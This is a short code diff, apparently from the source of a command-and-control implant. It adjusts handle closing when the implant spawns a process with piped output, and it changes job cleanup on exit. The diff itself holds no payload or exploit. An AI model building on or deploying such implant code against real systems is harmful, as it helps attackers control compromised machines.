@@ -443,7 +443,6 @@ VOID CommandProc( PPARSER Parser )
             PRINTF( "Process Verbose : %s [%d]\n", ProcessVerbose ? "TRUE" : "FALSE", ProcessVerbose );
 
             // TODO: make it optional to choose process arch
-            // TODO: cleanup process info
             if ( ! ProcessCreate( TRUE, Process, ProcessArgs, ProcessState, &ProcessInfo, ProcessPiped, NULL ) )
             {
                 PackageDestroy( Package );
@@ -454,8 +453,9 @@ VOID CommandProc( PPARSER Parser )
                 if ( ProcessVerbose )
                     PackageAddInt32( Package, ProcessInfo.dwProcessId );
 
-                Instance.Win32.NtClose( ProcessInfo.hProcess );
                 Instance.Win32.NtClose( ProcessInfo.hThread );
+                if ( ! ProcessPiped )
+                    Instance.Win32.NtClose( ProcessInfo.hProcess );
 
                 PRINTF( "Successful spawned process: %d\n", ProcessInfo.dwProcessId );
             }
@@ -2833,7 +2833,6 @@ VOID CommandExit( PPARSER Parser )
         JobList = JobList->Next;
 
         JobKill( JobID );
-        JobRemove( JobID );
     }
 
     // close all sockets
